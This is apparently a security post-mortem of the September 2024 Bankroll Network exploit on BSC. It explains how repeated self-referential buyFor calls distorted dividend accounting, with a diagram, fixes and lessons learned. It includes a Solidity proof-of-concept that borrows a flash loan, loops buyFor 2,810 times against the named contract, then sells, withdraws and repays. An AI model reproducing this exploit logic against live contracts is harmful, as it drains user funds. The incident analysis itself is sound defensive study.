# Bankroll Network — Dividend Manipulation via Repeated buyFor Calls

| Field | Details |
|------|------|
| **Date** | 2024-09-19 |
| **Protocol** | Bankroll Network Stack |
| **Chain** | BSC |
| **Loss** | ~404 WBNB |
| **Attacker** | [0x4645863205b47a0a3344684489e8c446a437d66c](https://bscscan.com/address/0x4645863205b47a0a3344684489e8c446a437d66c) |
| **Attack Tx** | [0xd4c7c11c46f81b6bf98284e4921a5b9f0ff97b4c71ebade206cb10507e4503b0](https://bscscan.com/tx/0xd4c7c11c46f81b6bf98284e4921a5b9f0ff97b4c71ebade206cb10507e4503b0) |
| **Vulnerable Contract** | [0x564D4126AF2B195fFAa7fB470ED658b1D9D07A54](https://bscscan.com/address/0x564D4126AF2B195fFAa7fB470ED658b1D9D07A54) |
| **Root Cause** | Dividend calculation error when `buyFor(address, amount)` is called repeatedly with the contract itself as the recipient |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-09/Bankroll_exp.sol) |

---

## 1. Vulnerability Overview

The Bankroll Network Stack contract allowed depositing WBNB and acquiring internal tokens via the `buyFor(address _customerAddress, uint256 buy_amount)` function. The attacker called `buyFor()` 2,810 times repeatedly using the contract itself (`address(bankRoll)`) as the recipient. Through this process, dividend calculations accumulated, enabling the attacker to `withdraw()` far more dividends than the amount actually deposited.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable pattern: buyFor allows the contract itself as recipient
function buyFor(address _customerAddress, uint256 buy_amount) external returns (uint256) {
    // ❌ Dividend calculation error when _customerAddress == address(this)
    // As the contract's own balance grows, dividend distribution ratio for other holders is distorted
    uint256 tokensBought = purchaseTokens(buy_amount);
    tokenBalanceLedger_[_customerAddress] += tokensBought;
    // dividends recalculated — external holder dividends increase as contract's own holdings grow
    return tokensBought;
}

// ✅ Correct code: disallow the contract itself as recipient
function buyFor(address _customerAddress, uint256 buy_amount) external returns (uint256) {
    require(_customerAddress != address(this), "Cannot buy for self");  // ✅ self disallowed
    uint256 tokensBought = purchaseTokens(buy_amount);
    tokenBalanceLedger_[_customerAddress] += tokensBought;
    return tokensBought;
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: Bankroll_decompiled.sol
contract Bankroll {
    function buyFor(address p0, uint256 p1) external {}  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─► PancakeSwap V3 Flash Loan: borrow 16,000 WBNB
  │
  ├─[2]─► bankRoll.buyFor(address(this), total WBNB) call
  │         └─► Internal tokens minted to attacker
  │
  ├─[3]─► Repeat 2,810 times:
  │         └─► bankRoll.buyFor(address(bankRoll), bal_bank_roll)
  │               └─► Contract itself as recipient — dividend accumulation manipulation
  │
  ├─[4]─► bankRoll.sell(myTokens()) call
  │         └─► Sell internal tokens
  │
  ├─[5]─► bankRoll.withdraw() call
  │         └─► Withdraw manipulated dividends
  │
  ├─[6]─► Repay flash loan
  │
  └─[7]─► Total loss: ~404 WBNB
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract AttackContract is Test {
    IBankrollNetworkStack bankRoll = IBankrollNetworkStack(0x564D4126AF2B195fFAa7fB470ED658b1D9D07A54);

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes memory) public {
        WBNB.approve(address(bankRoll), type(uint256).max);

        // [2] Buy for attacker itself
        bankRoll.buyFor(address(this), WBNB.balanceOf(address(this)));

        uint256 bal_bank_roll = WBNB.balanceOf(address(bankRoll));

        // [3] Repeat 2810 times with bankRoll contract itself as recipient (dividend manipulation)
        for (uint256 i = 0; i < 2810; i++) {
            bankRoll.buyFor(address(bankRoll), bal_bank_roll);
        }

        // [4] Sell internal tokens
        bankRoll.sell(bankRoll.myTokens());

        // [5] Withdraw manipulated dividends
        bankRoll.withdraw();

        // [6] Repay flash loan
        WBNB.transfer(address(pool), borrow_amount + fee0 + fee1);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **Vulnerability Type** | Business Logic Error — when `buyFor(address(this), amount)` is called with a self-referential address, the denominator (totalSupply) used in dividend calculation is distorted, causing the contract's own dividend share to increase abnormally |
| **Attack Technique** | Self-referential buyFor Dividend Manipulation (flash loan is a supplementary funding mechanism) |
| **DASP Category** | Price Oracle Manipulation |
| **CWE** | CWE-682: Incorrect Calculation |
| **Severity** | High |
| **Attack Complexity** | Medium |

## 6. Remediation Recommendations

1. **Prohibit self-reference**: Explicitly reject the `buyFor(address(this), ...)` pattern.
2. **Validate dividend calculation**: Modify the calculation logic so that the contract's own token holdings do not affect dividend distribution.
3. **Limit repeated calls**: Restrict the number of times the same function can be called repeatedly within a single block.
4. **Flash loan defense**: Add logic to detect and block large short-term liquidity deposits.

## 7. Lessons Learned

- **Self-referential vulnerability**: Functions that allow the contract itself as a recipient can cause unexpected state changes.
- **Dividend calculation fragility**: When dividends are calculated based on holding ratios, increasing the contract's own holdings distorts dividends for external holders.
- **Repeated call pattern**: Although 2,810 repetitions are required, the attack is viable as long as the profit exceeds the flash loan cost.